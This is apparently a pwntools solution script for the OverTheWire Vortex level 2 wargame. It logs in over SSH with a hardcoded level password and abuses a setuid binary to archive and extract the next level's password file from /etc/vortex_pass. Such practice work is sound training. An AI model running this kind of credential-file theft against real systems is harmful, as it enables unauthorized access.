from pwn import *

host = "vortex.labs.overthewire.org"
user = "vortex2"
password = r"23anbT\rE"
binary = "/vortex/vortex2"
passfile = "/etc/vortex_pass/vortex3"
shell = ssh(host=host, user=user, password=password)
shell.run("%s %s" % (binary, passfile))
password = shell.tar("xOf", "'/tmp/ownership.$$.tar'").strip()
print password
